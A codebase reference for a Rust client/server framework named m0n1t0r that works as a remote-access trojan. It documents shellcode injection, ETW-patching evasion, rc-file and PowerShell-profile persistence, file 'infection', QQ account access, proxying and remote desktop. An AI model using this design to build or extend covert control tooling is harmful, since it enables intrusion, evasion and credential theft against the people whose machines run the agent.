# Codebase Reference

Comprehensive code reference for m0n1t0r. For build instructions and high-level architecture, see [CLAUDE.md](CLAUDE.md).

## Workspace Layout

```
m0n1t0r/
  m0n1t0r-server/    # Server binary (TLS listener + REST/WS API)
  m0n1t0r-client/    # Client agent binary
  m0n1t0r-common/    # Shared RPC traits, types, error definitions
  m0n1t0r-build/     # Build-time config loading, cert validation, version tracking
  m0n1t0r-macro/     # Procedural macros (currently empty)
  m0n1t0r-ui/        # React + TypeScript + Vite + Ant Design dashboard
  xtask/             # Build automation (config generator, cert generator)
  deps/              # Vendored: qqkey (QQ account access), scrap (screen capture + wayland)
```

---

## m0n1t0r-common (Shared Library)

The contract between server and client. All RPC traits are defined here using `#[rtc::remote]` from the `remoc` crate, which auto-generates `*Client` and `*ServerSharedMut` types.

### Entry Point

- **`src/lib.rs`** — Re-exports all modules and the `Error`/`Result` types.

### Error System (`src/error.rs`)

Unified error enum used across all crates:

```
Error
  ├── Network(NetworkError)  — remoc channel errors, peer errors
  ├── Io(IoError)            — file system, user directory
  ├── Parse(ParseError)      — invalid parameter, unsupported format
  ├── External(ExternalError)— reqwest, qqkey, sysinfo, protobuf
  ├── NotFound
  ├── InitializationFailed
  ├── Unsupported            — platform doesn't support this operation
  ├── Unimplemented          — not yet implemented
  └── Unknown
```

All errors are `Serialize`/`Deserialize` (using `serde_error` for non-serializable inner errors) so they can be sent over remoc RPC channels.

### RPC Trait: `client::Client` (`src/client/mod.rs`)

The main RPC interface exposed by each client agent. The server calls these methods via `ClientClient`.

| Method | Returns | Notes |
|--------|---------|-------|
| `shell()` | `Shell` | Detects Zsh/Bash/Unknown from `$SHELL` |
| `version()` | `String` | From `CARGO_PKG_VERSION` |
| `target_platform()` | `TargetPlatform` | `Windows`/`Linux`/`MacOS`/`General` |
| `system_info()` | `info::System` | OS name, kernel, hostname, CPU, uptime |
| `build_time()` | `String` | From vergen `VERGEN_BUILD_TIMESTAMP` |
| `commit_hash()` | `String` | From vergen `VERGEN_RUSTC_COMMIT_HASH` |
| `terminate()` | `()` | Cancels the client's terminator token |
| `ping()` | `()` | No-op connectivity check |
| `fs_agent()` | `fs::AgentClient` | Spawns a file system agent |
| `process_agent()` | `process::AgentClient` | Spawns a process agent |
| `proxy_agent()` | `proxy::AgentClient` | Spawns a proxy agent |
| `network_agent()` | `network::AgentClient` | Spawns a network agent |
| `qq_agent()` | `qq::AgentClient` | Spawns a QQ agent |
| `autorun_agent()` | `autorun::AgentClient` | Spawns an autorun agent |
| `charset_agent()` | `charset::AgentClient` | Spawns a charset agent |
| `rd_agent()` | `rd::AgentClient` | Spawns a remote desktop agent |
| `blind_agent()` | `blind::AgentClient` | Spawns a blind (ETW) agent |
| `update_by_url(url, temp)` | `()` | Downloads URL to temp, self-replaces |
| `update_by_file(file, temp)` | `()` | Writes bytes to temp, self-replaces |
| `environment()` | `HashMap<String,String>` | `env::vars()` |
| `current_exe()` | `PathBuf` | Running binary path |
| `connected_time()` | `DateTime<Local>` | When client connected |

### RPC Trait: `server::Server` (`src/server/mod.rs`)

Server-side trait (called by client). Minimal: `version()`, `build_time()`, `commit_hash()`, `ping()`.

### Agent Traits

Each agent trait is defined in its own module with `#[rtc::remote]`. Default implementations are provided — platform-specific overrides happen in the client crate.

#### `fs::Agent` (`src/fs/mod.rs`)

File operations on the client machine.

| Method | Description |
|--------|-------------|
| `list(path)` | List directory entries |
| `list_recursive(path)` | Recursive directory listing |
| `read(path)` | Read file as `Vec<u8>` |
| `write(path, data)` | Write file |
| `append(path, data)` | Append to file |
| `create_directory(path)` | Create single directory |
| `create_directory_all(path)` | Create directories recursively |
| `remove_file(path)` / `remove_directory(path)` | Delete |
| `rename(from, to)` / `copy(from, to)` / `hardlink(from, to)` | File operations |
| `file(path)` / `symlink_file(path)` | Get metadata |
| `drives()` | List drive letters (Windows only, defaults to `Unsupported`) |

Data type `fs::File`: `{ name, path, size, is_dir, is_symlink }`.

#### `process::Agent` (`src/process/mod.rs`)

| Method | Description |
|--------|-------------|
| `execute(command, args)` | Run and wait for output (blocked) |
| `execute_detached(command, args)` | Spawn and forget |
| `interactive(command)` | Spawn with piped stdin/stdout/stderr via `bin::Sender`/`Receiver` |
| `list()` | List all processes (via sysinfo, parallel with rayon) |
| `kill_by_id(pid)` / `kill_by_name(name)` | Kill matching processes |
| `inject_shellcode_by_id_rtc(pid, shellcode, ep_offset, parameter)` | Windows only |
| `inject_shellcode_by_id_apc(pid, shellcode, ep_offset, parameter)` | Windows only |
| `voidgate(shellcode, ep_offset, key)` | Windows only |
| `id_by_name(name)` | Windows only |

Data types: `process::Process` (`{ name, cmd, exe, pid }`), `process::execute::Output` (`{ success, stdout, stderr }`).

#### `proxy::Agent` (`src/proxy/mod.rs`)

| Method | Description |
|--------|-------------|
| `connect(addr)` | Opens TCP connection from client, returns `(bin::Sender, bin::Receiver)` |
| `forward(addr)` | Binds listener on client, returns channel of `(Sender, Receiver, SocketAddr)` + canceller |

#### `network::Agent` (`src/network/mod.rs`)

| Method | Description |
|--------|-------------|
| `download(url, path)` | Download URL to file path on client (via reqwest) |

#### `qq::Agent` (`src/qq/mod.rs`)

| Method | Description |
|--------|-------------|
| `list()` | List logged-in QQ accounts |
| `urls(id)` | Get QZone/Weiyun/Mail/Qun URLs for account |
| `friends(id)` | Get friend groups for account |

Uses vendored `qqkey` crate.

#### `autorun::Agent` (`src/autorun/mod.rs`)

Persistence mechanisms.

| Method | Description |
|--------|-------------|
| `exist_current_user()` | Check if persistence is set up |
| `remove_current_user()` | Remove persistence |
| `add_current_user()` / `add_current_user_at(exe)` | Add persistence |
| `infect(target)` / `infect_at(target, exe)` | Infect target path |
| `infectious(target)` / `infectious_at(target, exe)` | Check if target is infectious |

All default to `Error::Unsupported`. Platform overrides in client.

#### `charset::Agent` (`src/charset/mod.rs`)

Windows Active Code Page handling: `acp_to_utf8(bytes)`, `acp()`.

#### `blind::Agent` (`src/blind/mod.rs`)

ETW evasion: `patch_etw_event_write()`.

#### `rd::Agent` (Remote Desktop, `src/rd/mod.rs`)

| Method | Description |
|--------|-------------|
| `displays()` | List available displays |
| `view(display, quality, kf)` | Start VP9 screen capture, returns `lr::Receiver<Vec<u8>>` |

Behind `rd` feature. Uses vendored `scrap` crate for capture, VP9 encoding via scrap's VPX encoder. Frames sent as protobuf `VideoFrame` messages.

### Utility Modules (`src/util/`)

- **`version.rs`** — `version()`, `build_time()`, `commit_hash()` from compile-time env vars
- **`shell.rs`** — `Shell` enum (Zsh/Bash/Unknown), `rc_file()` helper
- **`update.rs`** — `self_replace` + restart pattern
- **`network.rs`** — `download(url, path)` via reqwest
- **`time.rs`** — NTP sync, system time, local time helpers

### Info Module (`src/info/mod.rs`)

`info::System` struct with OS/kernel/hostname/CPU data collected via `sysinfo` crate.

---

## m0n1t0r-server

### Entry Point (`src/main.rs`)

1. Reads `config.toml` (path from CLI arg or default)
2. Parses into `FileConfig`, inits logger and optionally ffmpeg
3. Creates `Config` (TLS + addresses) and empty `ServerMap`
4. Runs `conn` and `api` subsystems concurrently via `tokio::select!`

### Config (`src/lib.rs`)

`Config` struct holds: `conn_addr`, `api_addr`, `tls_config` (rustls `ServerConfig`), `use_https`, `secret`.

`run()` splits config into `conn::Config` and `api::Config`, runs both with `select!`.

### Connection Module (`src/conn/mod.rs`)

Handles TLS client agent connections.

**Key types:**
- `ServerMap` — `HashMap<SocketAddr, Arc<RwLock<ServerObj>>>` + `watch` channel for connect/disconnect notifications
- `ConnectEvent` — `{ event: Connect|Disconnect|Invalid, addr: SocketAddr }`

**Connection flow:**
1. `run()` — Binds TLS TCP listener, loops accepting connections
2. `accept()` — TLS handshake, creates `ServerObj`, calls `make_channel()`
3. `make_channel()` — Sets up remoc `Connect::io()` over the TLS stream, returns `(RemoteSender<ServerClient>, RemoteReceiver<ClientClient>)`
4. Exchange: server sends its `ServerClient` to client, receives `ClientClient` back
5. `server_task()` — Runs `ServerServerSharedMut::serve()`, handles disconnect cleanup
6. In debug mode, runs `server::debug::run()` for smoke tests

### ServerObj (`src/server/mod.rs`)

Represents a connected client on the server side.

- `addr: SocketAddr` — client's address
- `canceller: CancellationToken` — cancels when connection drops
- `client_client: Option<ClientClient>` — RPC handle to invoke methods on the client
- `client()` → `&ClientClient` — accessor (errors if not initialized)
- `terminate()` — calls `client.terminate()` + cancels connection
- Implements `Server` trait (no overrides needed)

### Debug Module (`src/server/debug.rs`)

Only compiled in debug builds. Runs smoke tests against a newly connected client: lists files, checks platform, tests interactive shell, verifies charset on Windows.

### Web Module (`src/web/`)

#### `mod.rs`
- `AppState = Data<Arc<RwLock<ServerMap>>>`

#### `response.rs`
- `Response { code: i16, body: Value }` — JSON envelope
- `Response::success(body)` — code from `Error::Okay` (= 0)
- `Response::error(error)` — code from error discriminant

#### `error.rs`
Comprehensive error hierarchy with numeric codes and HTTP status mapping:

| Error | Code | HTTP Status |
|-------|------|-------------|
| Okay | 0 | 200 |
| Serialize | -1 | 422 |
| NotFound | -2 | 404 |
| Rpc | -3 | 502 |
| Actix | -4 | 500 |
| ChannelDisconnect | -5 | 502 |
| Command | -6 | 400 |
| Tokio IO | -7 | 500 |
| IpAddress | -8 | 400 |
| WebParameter | -9 | 400 |
| IntValue | -10 | 400 |
| QQKey | -11 | 500 |
| DnsLookupFailed | -12 | 502 |
| Socks5 | -13 | 502 |
| Forbidden | -14 | 403 |
| Generic | -16 | 500 |
| Unimplemented | -17 | 501 |
| InvalidForward | -18 | 502 |
| FFmpeg | -19 | 500 |
| PasswordMismatch | -20 | 403 |
| Unknown | -255 | 500 |

Implements `From<T>` for many external error types.

#### `util.rs`
- `extractor_config()` — configures Actix extractors with unified error handling. Multipart limit: 100 MB total, 50 MB memory.
- `handle_websocket(session, future)` — runs a future, closes WebSocket cleanly on success or error.

### API Routes (`src/web/api/`)

#### Setup (`api/mod.rs`)

Actix-web app with middleware stack:
- `Logger` — request logging
- `NormalizePath::trim` — trailing slash handling
- `IdentityMiddleware` + `SessionMiddleware` (cookie-based, key derived from `secret`)
- `Cors::permissive` — TODO: restrict origin

All routes under `/api/v1/`.

#### `get_agent!` macro (`api/client/mod.rs`)

Pattern used by all per-client endpoints:
```rust
let (agent, canceller) = get_agent!(data, &addr, fs_agent)?;
```
Looks up client in `ServerMap`, gets RPC `ClientClient`, calls the agent factory method, returns `(AgentClient, CancellationToken)`.

#### Client Endpoints

**`/api/v1/client`**

| Method | Path | Handler | Description |
|--------|------|---------|-------------|
| GET | `/` | `client::all` | List all connected clients with full info (parallel fetch) |
| GET | `/{addr}` | `client::get` | Get single client info |
| DELETE | `/{addr}` | `client::delete` | Terminate client connection |

Returns `Info` struct: `{ addr, version, target_platform, system_info, build_time, commit_hash, current_exe, connected_time }`.

**`/api/v1/client/{addr}/environments`**

| Method | Path | Handler | Description |
|--------|------|---------|-------------|
| GET | `/environments` | `environment::get` | Get client environment variables |

**`/api/v1/client/{addr}/notification`**

| Method | Path | Handler | Description |
|--------|------|---------|-------------|
| GET (WS) | `/notification` | `notification::get` | WebSocket that stays open while client is connected |

**`/api/v1/client/{addr}/fs`**

| Method | Path | Query | Description |
|--------|------|-------|-------------|
| GET | `/` | `type=file&path=...` | Read file (returns raw bytes) |
| GET | `/` | `type=directory&path=...` | List directory (or drives if path=/) |
| PUT | `/` | `type=file&path=...` | Write file (body = bytes) |
| PUT | `/` | `type=directory&path=...` | Create directory |
| DELETE | `/` | `type=file&path=...` | Delete file |
| DELETE | `/` | `type=directory&path=...` | Delete directory |
| GET | `/metadata` | `type=file&path=...` | Get file metadata |

**`/api/v1/client/{addr}/process`**

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | List all processes |
| DELETE | `/{value}?type=pid\|name` | Kill process by PID or name |
| POST | `/execute` | Execute command (form: `command`, `option=blocked\|detached`) |
| GET (WS) | `/interactive?command=...` | Interactive terminal WebSocket |

Interactive terminal: WebSocket bridges to stdin/stdout/stderr via remoc binary channels.

**`/api/v1/client/{addr}/proxy`**

| Method | Path | Description |
|--------|------|-------------|
| POST | `/socks5/noauth` | Start SOCKS5 proxy (no auth) |
| POST | `/socks5/pass` | Start SOCKS5 proxy (username/password) |
| POST | `/forward` | Start port forward (form: `from`, `to`) |

SOCKS5: server binds local listener, proxies through client's `proxy::Agent::connect()`. Forward: client binds listener, relays connections back to server-side target.

**`/api/v1/client/{addr}/network`**

| Method | Path | Description |
|--------|------|-------------|
| POST | `/download` | Download URL to path on client (form: `url`, `path`) |

**`/api/v1/client/{addr}/update`**

| Method | Path | Description |
|--------|------|-------------|
| POST | `/byurl` | Update client binary from URL |
| POST | `/byfile` | Update client binary from uploaded file (multipart, 50MB limit) |

Both use `self_replace` + restart pattern.

**`/api/v1/client/{addr}/qq`**

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | List logged-in QQ accounts |
| GET | `/{id}/url` | Get QQ service URLs for account |
| GET | `/{id}/friends` | Get friend list for account |

**`/api/v1/client/{addr}/autorun`**

| Method | Path | Description |
|--------|------|-------------|
| GET | `/infectious?target=...&exe=...` | Check if target is infectious |
| POST | `/infectious` | Infect target path |

**`/api/v1/client/{addr}/rd`** (requires `rd` feature)

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | List available displays |
| GET (WS) | `/stream/mpeg1video?display=N&quality=F&kf=N` | MPEG-1 video in MPEG-TS over WebSocket |
| GET (WS) | `/stream/yuv?display=N&quality=F` | Raw YUV420P frames over WebSocket |
| GET (WS) | `/stream/rgb?display=N&quality=F&format=raw\|abgr\|argb` | RGB frames over WebSocket |

Remote desktop pipeline: VP9 capture on client → remoc channel → server decodes VP9 → re-encodes to MPEG-1/YUV/RGB → WebSocket to browser.

`ts_mux.rs` implements a minimal MPEG-TS muxer (PAT/PMT generation, PES packetization) for the mpeg1video stream.

#### Server Endpoints

**`/api/v1/server`**

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | Server version/build info |
| GET (WS) | `/notification` | Client connect/disconnect events (via `watch` channel) |
| GET | `/proxy` | List active proxy sessions |
| DELETE | `/proxy/{key}` | Close proxy session |

Global proxy state in `lazy_static! PROXY_MAP: Arc<RwLock<ProxyMap>>` using `slotmap`.

#### Session Endpoints

**`/api/v1/session`** — `POST` (login) and `DELETE` (logout), both TODO/unimplemented.

### Server Build Script (`build.rs`)

On Windows (`winnt` feature): embeds Windows resource manifest with icon using `winres`.

---

## m0n1t0r-client

### Entry Point (`src/lib.rs`)

`Config { host, port }` → `run()` loops `conn::run()` with 10-second reconnect delay.

### Init Module (`src/init.rs`)

Calls C++ `init()` via `cxx::bridge` (from `m0n1t0r-cpp-general-lib/include/init.h`). Runs in a separate `std::thread` with `oneshot` channel back to async context.

### ClientObj (`src/client/mod.rs`)

The client-side counterpart to `ServerObj`. Holds:
- `addr: SocketAddr`
- `canceller: CancellationToken` — connection lifecycle
- `server_client: Option<ServerClient>` — RPC handle to server
- `terminator: CancellationToken` — for `terminate()` command
- `time: DateTime<Local>` — connection timestamp

Implements `Client` trait. Agent factory methods (`fs_agent()`, `process_agent()`, etc.) use the `create_agent_instance!` macro.

### Macro System (`src/client/macro.rs`)

Three macros drive platform dispatch:

**`declare_agents!`** — Conditionally imports agent modules based on feature flags:
```rust
declare_agents!(general, [proxy, network, qq, rd], ["general", "macos", "linux", "winnt"]);
declare_agents!(windows, [process, autorun, charset, fs, blind], ["winnt"]);
```

**`default_agents!`** — Generates no-op `AgentObj` structs for unsupported platforms:
```rust
default_agents!([network, proxy, process, autorun, qq, charset, fs, rd, blind]);
```

**`create_agent_instance!`** — Creates an agent server + client pair:
```rust
let server = Arc::new(RwLock::new($name::AgentObj::new()));
let (server_server, server_client) = AgentServerSharedMut::<_>::new(server, 1);
tokio::spawn(server_server.serve(true));
Ok(server_client)
```

### General Agents (`src/client/general/mod.rs`)

Cross-platform defaults: `network`, `proxy`, `process`, `autorun`, `qq`, `charset`, `fs`, `rd`, `blind`. All use `default_agents!` macro which creates empty `AgentObj` implementing traits with default (often `Unsupported`) behavior.

### Windows Agents (`src/client/windows/`)

Platform-specific overrides using Win32 APIs and C++ FFI:

- **`process.rs`** — Overrides `execute` (via C++ FFI), `interactive` (with `CREATE_NO_WINDOW`), `inject_shellcode_by_id_rtc`, `inject_shellcode_by_id_apc`, `voidgate`, `id_by_name`. C++ headers from `m0n1t0r-cpp-windows-lib`.
- **`fs.rs`** — Overrides `drives()` using `GetLogicalDrives()` + `bit_iter`.
- **`charset.rs`** — Implements `acp_to_utf8()` and `acp()` via C++ FFI.
- **`blind.rs`** — Implements `patch_etw_event_write()` via C++ FFI.
- **`autorun.rs`** — Windows persistence via PowerShell `$PROFILE` + C++ FFI for `infect_at`/`infectious_at`.

### Unix Agents (`src/client/unix/`)

- **`autorun.rs`** — Unix persistence via shell rc files (`.bashrc`/`.zshrc`). Appends `(exe &> /dev/null &)` to rc file. Implements `exist_current_user`, `remove_current_user`, `add_current_user_at`.

---

## m0n1t0r-build

Build-time library, used in `build.rs` scripts and `xtask`.

- **`config.rs`** — `FileConfig` struct matching `config.toml`. Provides `path()`, `ensure()` (panics if missing), `check()`, `read()`. Config is read at compile time to bake values into binaries.
- **`cert.rs`** — `path()` returns `[ca, cert, key]` paths. `ensure()` panics if certs missing. `check()` returns whether any are missing.
- **`version.rs`** — Calls `vergen` to emit build metadata env vars.
- **`dep.rs`** — `check_xmake()`, `check_xrepo()`, `xrepo_fetch(dep)` — validates and fetches native dependencies.

---

## xtask

CLI tool with two commands:

- **`-i` / `--init`** — Interactive `config.toml` generator. Prompts for all config fields with sensible defaults. Won't overwrite existing valid config.
- **`-c` / `--cert`** — TLS certificate generator using `rcgen`. Creates a self-signed CA + end-entity cert pair (10-year validity). Writes to paths specified in config.

---

## m0n1t0r-ui

React SPA with Ant Design (dark theme).

### Build & Config

- **Runtime**: Bun (install + build)
- **Bundler**: Vite
- **Framework**: React 18 + TypeScript
- **UI Library**: Ant Design 5
- **HTTP Client**: Axios
- **Terminal Emulator**: xterm.js
- **Video Player**: JSMpeg (for MPEG-TS WebSocket streams)

### Routing (`src/App.tsx`)

| Path | Page | Description |
|------|------|-------------|
| `/` | Dashboard | Overview/landing page |
| `/clients` | ClientList | All connected clients |
| `/clients/:addr` | ClientDetail | Tabbed client management |
| `/server` | ServerInfo | Server version info |
| `/settings` | Settings | Backend URL configuration |
| `*` | NotFound | 404 page |

All routes wrapped in `Layout` component (sidebar navigation).

### API Layer (`src/api/`)

- **`client.ts`** — Axios instance with base URL from settings, response interceptor checking `code !== 0`.
- **`clients.ts`** — `listClients()`, `getClient(addr)`, `deleteClient(addr)`, `getEnvironments(addr)`.
- **`fs.ts`** — File operations: `listFiles`, `readFile`, `writeFile`, `deleteFile`, `deleteDirectory`, `createDirectory`, `getFileMetadata`.
- **`process.ts`** — `listProcesses`, `killProcess`, `executeCommand`.
- **`proxy.ts`** — `createSocks5NoAuth`, `createSocks5Pass`, `createForward`.
- **`network.ts`** — `downloadToClient`.
- **`server.ts`** — `getServerInfo`, `listProxies`, `deleteProxy`.
- **`types.ts`** — TypeScript interfaces mirroring Rust types.

### Hooks (`src/hooks/`)

- **`useWebSocket.ts`** — Generic WebSocket hook with auto-connect, binary mode support.
- **`useNotification.ts`** — Connects to `/server/notification` WebSocket, auto-reconnects on close (3s delay).

### Components (`src/components/`)

| Component | Description |
|-----------|-------------|
| `Layout` | Sidebar with Sider nav + Outlet |
| `FileManager` | File browser with breadcrumb nav, upload/download/delete |
| `ProcessManager` | Process list table with kill actions |
| `Terminal` | xterm.js terminal over WebSocket (`/process/interactive`) |
| `EnvironmentVars` | Environment variable table |
| `ProxyManager` | Create SOCKS5/forward proxies, list active proxies |
| `RemoteDesktop` | JSMpeg player consuming MPEG-TS WebSocket stream |
| `NetworkDownload` | Form to download URL to path on client |
| `ClientUpdate` | Update client binary via URL or file upload |

### Settings (`src/utils/settings.ts`)

Settings stored in `localStorage` under `m0n1t0r_settings`:
- `backendUrl` — Override API base URL (empty = same origin)
- `skipSslCheck` — UI-only flag

`getApiBaseUrl()` and `getWsBaseUrl(path)` derive HTTP/WS URLs from settings or fallback to current origin.

### Pages (`src/pages/`)

- **`Dashboard.tsx`** — Landing page
- **`ClientList.tsx`** — Table of all clients with connect/disconnect notification
- **`ClientDetail.tsx`** — Tabbed view: Overview, File Manager, Processes, Terminal, Environment, Proxy, Remote Desktop, Network, Update
- **`ServerInfo.tsx`** — Server version details
- **`Settings.tsx`** — Backend URL config form
- **`NotFound.tsx`** — 404 page

---

## Data Flow Summary

```
Browser (React)
    │
    ├── REST API (axios) ──► Actix-web ──► ServerMap lookup ──► ClientClient RPC ──► Agent on client
    │
    └── WebSocket ──► actix-ws ──► remoc channels ──► Client agent
                                                         │
Client Agent ◄──── TLS (TCP) ──── remoc Connect::io ──── Server conn module
    │
    ├── AgentObj (fs/process/proxy/...) ← platform-specific impl
    └── C++ FFI (via cxx) ← Windows-specific native code
```

## Feature Flag Matrix

| Feature | Server | Client | Description |
|---------|--------|--------|-------------|
| `macos` | Yes | Yes | macOS platform code |
| `linux` | Yes | Yes | Linux platform code |
| `winnt` | Yes | Yes | Windows platform code |
| `winnt-uac` | No | Yes | Windows with UAC manifest |
| `rd` | Yes | Yes | Remote desktop (ffmpeg, scrap, hbb_common) |
| `general` | No | Yes | Generic fallback (no platform-specific code) |

Exactly one platform flag must be set. `rd` is optional and additive.
